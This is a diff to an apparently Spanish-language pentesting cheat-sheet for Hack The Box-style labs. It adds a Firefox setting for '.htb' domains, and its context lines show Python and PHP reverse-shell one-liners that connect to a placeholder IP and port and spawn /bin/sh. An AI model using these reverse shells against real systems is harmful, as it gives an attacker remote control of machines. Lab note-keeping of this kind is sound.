@@ -45,3 +45,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 php -r '$sock=fsockopen("{IP}",{PUERTO});exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+
+## Excluir dominio de la busqueda de firefox:
+
+```bash
+about:config
+browser.fixup.domainsuffixwhitelist.htb -> true
+```
